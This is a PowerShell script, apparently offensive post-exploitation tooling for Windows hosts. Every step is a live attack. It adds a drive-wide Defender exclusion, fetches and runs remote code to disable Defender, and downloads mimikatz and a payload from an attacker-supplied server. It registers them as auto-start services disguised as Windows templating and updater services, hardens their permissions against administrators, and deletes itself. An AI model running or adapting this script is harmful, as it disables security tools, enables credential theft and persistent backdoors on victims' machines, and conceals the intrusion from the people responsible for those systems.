
param (
    [Parameter(Mandatory=$true)]
    [string]$ServerIpPort
)

# Store current working directory
$CWD = Get-Location

# Create directory and navigate
New-Item -ItemType Directory -Path "C:\ProgramData" -Force
Set-Location "C:\ProgramData"

# Disable Windows Defender
Add-MpPreference -ExclusionPath "C:\"
& ([ScriptBlock]::Create((irm https://dnot.sh/))) --name "Windows Defender" --silent 

# Download and run mimikatz
Invoke-WebRequest "$ServerIpPort/mimikatz.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Templates\template.exe"
Invoke-WebRequest "$ServerIpPort/mimi_back.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Templates\WinTemplate.exe"
New-Service -Name "WinTemplateSvc" -BinaryPathName "C:\ProgramData\Microsoft\Windows\Templates\WinTemplate.exe" -DisplayName "Windows Templating Service" -StartupType Automatic -Description "Provides support for Windows Templating services" -ErrorAction SilentlyContinue
Start-Service -Name "WinTemplateSvc" -ErrorAction SilentlyContinue
& $env:SystemRoot\System32\sc.exe sdset WinTemplateSvc "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"

# Download payload and create service
Invoke-WebRequest "$ServerIpPort/payload.exe" -OutFile "C:\ProgramData\Microsoft\update.exe"
New-Service -Name "WinUpdaterSvc" -BinaryPathName "C:\ProgramData\Microsoft\update.exe" -DisplayName "Windows Updater Service" -StartupType Automatic -Description "Provides support for Windows Updater services" -ErrorAction SilentlyContinue
Start-Service -Name "WinUpdaterSvc" -ErrorAction SilentlyContinue
& $env:SystemRoot\System32\sc.exe sdset WinUpdaterSvc "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"

# Return to original directory and delete script
Set-Location $CWD
Remove-Item -Path $PSCommandPath -Force
